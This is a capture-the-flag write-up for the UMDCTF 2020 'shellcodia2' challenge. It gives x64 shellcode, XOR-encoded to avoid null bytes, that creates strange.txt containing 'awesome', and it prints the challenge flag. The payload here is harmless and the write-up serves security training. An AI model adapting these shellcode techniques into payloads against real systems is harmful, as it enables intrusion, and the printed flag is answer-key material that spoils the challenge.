
## shellcodia2 (600pt)
### Description

> Welcome back to shellcodia! You know the drill. Simply connect, submit your shellcode in binary form, and if  you've completed the challenge then a flag will return. This challenge  requires you to create a file named `strange.txt` and put the string `awesome` inside. Now, a few things to remember, these are x64 machines so don't think  you can sneak by with 32bit shellcode. Additionally, the environment  assumes nothing about the shellcode you give it. It's highly unlikely  that if you break the environment, even if you accomplished the goal,  you will get the flag. 
>
> Submit your shellcode to: `157.245.88.100:7779` Good luck! 
>
> Author: `quantumite (BlueStar)` 
>
> (Note: flag is in `UMDCTF{}` format)

### Analysis

Goal: create a file named `strange.txt` and put the string `awesome` inside.

We can use `syscall` to finish it.

```nasm
rax = SYS_creat("strange.txt",0777);
SYS_write(rax, "awesome" ,7);
```

### Solution

```nasm
push 0x1010101 ^ 0x747874
xor dword ptr [rsp], 0x1010101
mov rax, 0x2e65676e61727473
push rax
mov rdi, rsp
mov rsi, 0x1ff
/* call creat() */
mov rax, SYS_creat /* 0x55 */
syscall

mov rdi, rax   /* fd */

mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x656d6f73657761
xor [rsp], rax
mov rsi, rsp
mov rdx, 0x7
/* call write() */
mov rax, SYS_write /* 1 */
syscall

/* stack balance*/
pop rcx
pop rcx
pop rcx

ret
```

> There is one thing to note in writing shellcode, stack should be **balanced** before `ret` 

> flag: UMDCTF{uu_rr_ G3tt1nG_g00d_w1tH_Th1s_$h3llc0de_stUff}

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/UMDCTF2020/pwn/shellcode2) 


